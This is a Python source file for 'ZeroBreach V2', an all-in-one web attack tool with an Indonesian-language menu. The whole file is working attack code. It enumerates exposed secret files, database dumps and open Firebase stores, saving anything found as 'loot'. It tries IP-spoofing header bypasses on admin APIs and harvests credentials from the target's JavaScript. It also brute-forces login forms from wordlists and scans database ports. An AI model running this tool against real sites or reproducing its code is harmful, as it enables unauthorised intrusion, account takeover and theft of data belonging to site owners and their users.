#!/usr/bin/env python3
"""
ZeroBreach V2 — all-in-one recon + exploit + dump + brute.
Input: domain / endpoint. Output: loot + report.
"""

import json
import os
import random
import re
import socket
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

import requests
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


# ============================================================
# MENU RAPI
# ============================================================
MENU = f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════╗
║                    ZEROBREACH V2                         ║
║          recon · exploit · dump · brute                  ║
╚══════════════════════════════════════════════════════════╝{RESET}

{Y}Pilih mode:{RESET}
  {G}[1]{RESET} Full Auto      — jalanin semua stage
  {G}[2]{RESET} Recon Only     — fingerprint + endpoint enum
  {G}[3]{RESET} Leak Check     — file sensitif (.env, .git, sql)
  {G}[4]{RESET} Bypass Test    — header bypass
  {G}[5]{RESET} Brute Force    — login brute pake wordlist
  {G}[6]{RESET} Firebase Check — cek misconfig Firebase
  {G}[7]{RESET} JS Mining      — cari credential di JS
  {G}[8]{RESET} Port Scan      — cek port DB terbuka
  {G}[0]{RESET} Keluar
"""


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def pause():
    input(f"\n{C}[?]{RESET} ENTER buat lanjut...")


def log(kind, msg):
    tag = {
        "info": f"{C}[*]{RESET}",
        "ok":   f"{G}[+]{RESET}",
        "warn": f"{Y}[!]{RESET}",
        "err":  f"{R}[-]{RESET}",
        "crit": f"{M}[X]{RESET}",
        "dump": f"{G}{BOLD}[DUMP]{RESET}",
        "hit":  f"{G}{BOLD}[HIT]{RESET}",
    }[kind]
    print(f"{tag} {msg}")


def safe_name(s):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:100]


def looks_like_data(text):
    t = text.strip().lower()
    if not t or len(t) < 20:
        return False
    if t.startswith(("{", "[")):
        return True
    if re.search(r"^[A-Z_]{3,}\s*=", text, re.M):
        return True
    if re.search(r"\[\d{4}-\d{2}-\d{2}", text):
        return True
    if re.search(r"(DB_PASSWORD|DB_USER|APP_KEY|SECRET|API_KEY)", text):
        return True
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return True
    if "<!doctype html" in t or "<html" in t:
        if "login" in t or "password" in t:
            return False
        if "<body" in t and len(t) > 500:
            return False
    return False


def get_kind(text):
    t = text.strip()
    if t.startswith(("{", "[")):
        return "json"
    if re.search(r"^[A-Z_]{3,}\s*=", text, re.M):
        return "env"
    if re.search(r"\[\d{4}-\d{2}-\d{2}", text):
        return "log"
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return "sql"
    return "txt"


PATHS = [
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/api/keys", "/api/token", "/api/me", "/api/profile",
    "/api/users/count", "/api/servers", "/api/nodes",
    "/api/application/users", "/api/application/servers",
    "/api/application/nodes", "/api/application/locations",
    "/api/client/account", "/api/logs", "/api/db",
    "/api/database", "/api/backup", "/api/export",
    "/api/orders", "/api/transactions", "/api/files",
    "/api/v1/users", "/api/v2/users",
    "/.env", "/.env.local", "/.env.backup", "/.env.production",
    "/config.json", "/config.js", "/config.php", "/config.yaml",
    "/secrets.json", "/credentials.json", "/firebase.json",
    "/google-services.json", "/serviceAccount.json",
    "/.git/config", "/.git/HEAD",
    "/storage/logs/laravel.log", "/error.log", "/debug.log",
    "/phpinfo.php", "/info.php",
    "/db.sql", "/dump.sql", "/backup.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz",
    "/admin", "/admin/login", "/dashboard", "/phpmyadmin",
    "/administrator", "/wp-admin",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql",
]


BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]


LOGIN_PATHS = [
    "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/admin/login", "/api/v1/login",
]


# ============================================================
# CORE
# ============================================================
class ZeroBreach:
    def __init__(self, target, timeout=8, threads=20, outdir="loot",
                 users_file="users.txt", wordlist_file="wordlist.txt"):
        self.target = target.rstrip("/")
        if not self.target.startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.timeout = timeout
        self.threads = threads
        self.outdir = outdir
        os.makedirs(self.outdir, exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})

        self.hits = []
        self.loot = []
        self.users = self._load(users_file)
        self.wordlist = self._load(wordlist_file)
        self.found_creds = None

    def _load(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            return []

    def _req(self, method, path, headers=None, data=None, json_data=None,
             allow_redirects=True):
        url = path if path.startswith("http") else self.target + path
        try:
            return self.session.request(
                method=method, url=url, headers=headers,
                data=data, json=json_data,
                timeout=self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
        except Exception:
            return None

    def get(self, p, **kw): return self._req("GET", p, **kw)
    def post(self, p, **kw): return self._req("POST", p, **kw)

    def _record(self, sev, name, detail):
        self.hits.append((sev, name, detail))
        icon = {
            "crit": f"{M}[CRIT]{RESET}",
            "high": f"{R}[HIGH]{RESET}",
            "med":  f"{Y}[MED]{RESET}",
            "info": f"{C}[INFO]{RESET}",
        }[sev]
        print(f"{icon} {name}")
        print(f"        {W}{detail}{RESET}")

    def _save(self, name, body):
        kind = get_kind(body)
        fname = f"{safe_name(name)}.{kind}"
        fpath = os.path.join(self.outdir, fname)
        with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
            f.write(body)
        return fpath

    def _auto_dump(self, label, r):
        body = r.text
        if not looks_like_data(body):
            return False
        saved = self._save(label, body)
        kind = get_kind(body)
        size = len(body)
        log("dump", f"{label} [{kind}] {size}B -> {saved}")
        self.loot.append((label, kind, size, saved))
        self._record("crit", f"Dump: {label}", f"{kind} | {size}B | {saved}")
        return True

    # ---------------- STAGE ----------------
    def stage_fingerprint(self):
        print(f"\n{C}=== STAGE 1: FINGERPRINT ==={RESET}")
        r = self.get("/")
        if not r:
            log("err", "Target nggak respon.")
            return False
        log("ok", f"Target hidup: HTTP {r.status_code}")
        log("info", f"Server: {r.headers.get('Server', '?')}")
        log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")

        body = r.text.lower()
        tech = []
        for kw, name in [
            ("wp-content", "WordPress"), ("laravel", "Laravel"),
            ("_next", "Next.js"), ("react", "React"),
            ("vue", "Vue"), ("pterodactyl", "Pterodactyl"),
            ("firebase", "Firebase"), ("cloudflare", "Cloudflare"),
        ]:
            if kw in body:
                tech.append(name)
        if tech:
            log("ok", f"Tech: {', '.join(sorted(set(tech)))}")
        return True

    def stage_endpoints(self):
        print(f"\n{C}=== STAGE 2: ENDPOINT ENUM ({len(PATHS)} path) ==={RESET}")

        def _check(p):
            return p, self.get(p, allow_redirects=False)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, p) for p in PATHS]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                p, r = res
                if not r:
                    continue
                code = r.status_code
                if code == 200:
                    if not self._auto_dump(p, r):
                        if len(r.text) > 300:
                            self._record("med", f"Endpoint aktif: {p}",
                                         f"HTTP 200 | {len(r.text)}B")
                elif code == 401:
                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
                elif code == 500:
                    self._record("high", f"Error 500: {p}", "potensi info leak")

    def stage_leaks(self):
        """Sama kayak stage_endpoints, tapi fokus file leak."""
        leaks = [
            "/.env", "/.env.local", "/.env.backup",
            "/config.json", "/config.js", "/config.php",
            "/secrets.json", "/credentials.json",
            "/.git/config", "/.git/HEAD",
            "/storage/logs/laravel.log",
            "/db.sql", "/dump.sql", "/backup.sql",
            "/backup.zip", "/backup.tar.gz",
            "/phpinfo.php", "/info.php",
        ]
        print(f"\n{C}=== LEAK CHECK ({len(leaks)} file) ==={RESET}")
        for p in leaks:
            r = self.get(p, allow_redirects=False)
            if not r:
                continue
            if r.status_code == 200 and len(r.text) > 20:
                self._auto_dump(p, r)

    def stage_bypass(self):
        print(f"\n{C}=== STAGE 3: HEADER BYPASS ==={RESET}")
        targets = ["/api/users", "/api/admin", "/api/config",
                   "/api/application/users", "/api/servers"]
        for t in targets:
            base = self.get(t, allow_redirects=False)
            if base and base.status_code == 200:
                continue
            for h in BYPASS_HEADERS:
                r = self.get(t, headers=h, allow_redirects=False)
                if r and r.status_code == 200:
                    log("crit", f"Bypass tembus: {t} via {list(h.keys())[0]}")
                    self._record("crit", f"Header bypass: {t}",
                                 f"{list(h.keys())[0]}={list(h.values())[0]}")
                    self._auto_dump(f"bypass{t}", r)
                    break

    def stage_js(self):
        print(f"\n{C}=== STAGE 4: JS MINING ==={RESET}")
        r = self.get("/")
        if not r:
            return
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        js_urls = [urljoin(self.target, u) for u in js_urls][:15]

        if not js_urls:
            log("info", "Nggak ada JS.")
            return

        cred_re = re.compile(
            r'(api[_-]?key|apikey|secret|token|bearer|auth|password)'
            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            re.I,
        )
        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')

        for js in js_urls:
            jr = self.get(js)
            if not jr or jr.status_code != 200:
                continue
            for m in cred_re.finditer(jr.text):
                k, v = m.group(1), m.group(2)
                if v.lower() in ("undefined", "null", "none", ""):
                    continue
                log("crit", f"Cred di JS: {k}={v[:60]}")
                self._record("crit", "Credential di JS", f"{k}={v[:60]}")
                self._save(f"cred_{k}", f"{k}={v}")

            eps = list(set(ep_re.findall(jr.text)))[:20]
            for ep in eps:
                self._record("info", "Endpoint di JS", ep)
                er = self.get(ep)
                if er and er.status_code == 200:
                    self._auto_dump(f"js{ep}", er)

    def stage_firebase(self):
        print(f"\n{C}=== STAGE 5: FIREBASE CHECK ==={RESET}")
        r = self.get("/")
        if not r:
            return
        project = None
        m = re.search(r'"projectId"\s*:\s*"([^"]+)"', r.text)
        if m:
            project = m.group(1)
        if not project:
            log("info", "Nggak ketemu Firebase config.")
            return
        log("info", f"Firebase project: {project}")
        for u in [
            f"https://{project}.firebaseio.com/.json",
            f"https://{project}-default-rtdb.firebaseio.com/.json",
        ]:
            try:
                rr = requests.get(u, timeout=self.timeout, verify=False)
                if rr.status_code == 200 and looks_like_data(rr.text):
                    log("crit", f"FIREBASE DUMP: {u}")
                    self._save(f"firebase_{project}", rr.text)
                    self._record("crit", "Firebase misconfig", f"{u}")
            except Exception:
                pass

    def _try_login(self, path, user, pw):
        for key_u, key_p in [("email", "password"), ("username", "password"),
                             ("user", "pass")]:
            try:
                r = self.post(
                    path,
                    json_data={key_u: user, key_p: pw},
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                )
                if r and r.status_code in (200, 201, 302):
                    body = r.text.lower()
                    if any(k in body for k in ("token", "success", "welcome", "dashboard")):
                        return (user, pw, r.text[:1000])
            except Exception:
                pass
        return None

    def stage_creds(self):
        print(f"\n{C}=== STAGE 6: BRUTE FORCE ==={RESET}")
        if not self.users or not self.wordlist:
            log("warn", "users.txt / wordlist.txt kosong.")
            return

        log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")

        for lp in LOGIN_PATHS:
            r = self.post(lp, json_data={})
            if not r or r.status_code == 404:
                continue
            log("info", f"Coba login di: {lp}")

            found = None
            with ThreadPoolExecutor(max_workers=5) as ex:
                futs = {}
                for u in self.users:
                    for p in self.wordlist:
                        futs[ex.submit(self._try_login, lp, u, p)] = (u, p)

                for f in as_completed(futs):
                    res = f.result()
                    if res:
                        found = res
                        log("hit", f"LOGIN BERHASIL: {lp} | {res[0]}:{res[1]}")
                        self.found_creds = (lp, res[0], res[1])
                        self._record("crit", f"Login berhasil: {lp}",
                                     f"{res[0]}:{res[1]}")
                        for ff in futs:
                            ff.cancel()
                        break
            if found:
                break

    def stage_ports(self):
        print(f"\n{C}=== STAGE 7: PORT SCAN ==={RESET}")
        host = urlparse(self.target).hostname
        if not host:
            return
        ports = {
            21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS",
            3306: "MySQL", 6379: "Redis", 27017: "MongoDB",
        }
        for port, name in ports.items():
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                sev = "info" if port in (80, 443) else "high"
                self._record(sev, f"Port terbuka: {port}", name)
            except Exception:
                pass

    # ---------------- REPORT ----------------
    def report(self):
        print()
        print(f"{C}{'=' * 62}{RESET}")
        print(f"{C}{BOLD}  REPORT — {self.target}{RESET}")
        print(f"{C}{'=' * 62}{RESET}")

        counts = {"crit": 0, "high": 0, "med": 0, "info": 0}
        for s, _, _ in self.hits:
            counts[s] = counts.get(s, 0) + 1

        print(f"  {M}CRIT: {counts['crit']}{RESET}  "
              f"{R}HIGH: {counts['high']}{RESET}  "
              f"{Y}MED: {counts['med']}{RESET}  "
              f"{C}INFO: {counts['info']}{RESET}")
        print(f"  {G}Files dumped: {len(self.loot)}{RESET}\n")

        order = {"crit": 0, "high": 1, "med": 2, "info": 3}
        for sev, name, detail in sorted(self.hits, key=lambda x: order[x[0]]):
            icon = {
                "crit": f"{M}[CRIT]{RESET}",
                "high": f"{R}[HIGH]{RESET}",
                "med":  f"{Y}[MED]{RESET}",
                "info": f"{C}[INFO]{RESET}",
            }[sev]
            print(f"{icon} {name}")
            print(f"        {W}{detail}{RESET}")

        print()
        print(f"{G}[+] Loot: {self.outdir}/")
        print(f"{G}[+] Total file dumped: {len(self.loot)}")

        try:
            with open("zerobreach_report.json", "w") as f:
                json.dump({
                    "target": self.target,
                    "creds_found": self.found_creds,
                    "hits": self.hits,
                    "loot": [{"label": l, "kind": k, "size": s, "file": fp}
                             for l, k, s, fp in self.loot],
                }, f, indent=2)
            print(f"{G}[+] Report: zerobreach_report.json{RESET}")
        except Exception:
            pass

    # ---------------- RUNNER ----------------
    def run(self, stages="full"):
        if stages in ("full", "recon"):
            if not self.stage_fingerprint():
                return
            self.stage_endpoints()
        if stages in ("full", "recon"):
            self.stage_bypass()
            self.stage_js()
            self.stage_firebase()
            self.stage_creds()
            self.stage_ports()
        elif stages == "leak":
            self.stage_leaks()
        elif stages == "bypass":
            self.stage_bypass()
        elif stages == "brute":
            self.stage_creds()
        elif stages == "firebase":
            self.stage_firebase()
        elif stages == "js":
            self.stage_js()
        elif stages == "ports":
            self.stage_ports()

        self.report()


# ============================================================
# MAIN — MENU
# ============================================================
def get_target():
    t = input(f"{C}[?]{RESET} URL target: ").strip()
    if not t:
        log("err", "URL kosong.")
        return None
    return t


def main():
    clear()
    while True:
        print(MENU)
        pilihan = input(f"{C}[?]{RESET} Pilih: ").strip()

        if pilihan == "0":
            print(f"\n{Y}[!] Keluar. 6767.{RESET}")
            sys.exit(0)

        if pilihan not in [str(i) for i in range(1, 9)]:
            clear()
            log("err", "Pilihan nggak valid.")
            time.sleep(1)
            clear()
            continue

        target = get_target()
        if not target:
            time.sleep(1)
            clear()
            continue

        outdir = input(f"{C}[?]{RESET} Outdir (default loot): ").strip() or "loot"
        threads_in = input(f"{C}[?]{RESET} Threads (default 20): ").strip() or "20"
        try:
            threads = int(threads_in)
        except ValueError:
            threads = 20

        clear()
        print(f"{G}{BOLD}=== ZeroBreach V2 ==={RESET}")
        print(f"{C}Target : {W}{target}{RESET}")
        print(f"{C}Outdir : {W}{outdir}{RESET}")
        print(f"{C}Threads: {W}{threads}{RESET}\n")

        tool = ZeroBreach(target, threads=threads, outdir=outdir)

        stages = {
            "1": "full",
            "2": "recon",
            "3": "leak",
            "4": "bypass",
            "5": "brute",
            "6": "firebase",
            "7": "js",
            "8": "ports",
        }[pilihan]

        try:
            tool.run(stages=stages)
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Interrupted.{RESET}")

        pause()
        clear()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Keluar.{RESET}")
        sys.exit(0)
